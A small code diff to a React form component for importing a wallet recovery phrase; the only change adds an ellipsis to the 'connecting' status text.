@@ -136,7 +136,7 @@ function Form() {
             <p>Typically 12 (sometimes 24) words separated by single spaces</p>
 
             <button>Import</button>
-            {done && 'connecting'}
+            {done && 'connecting...'}
         </form>
     </FormCont>
   )
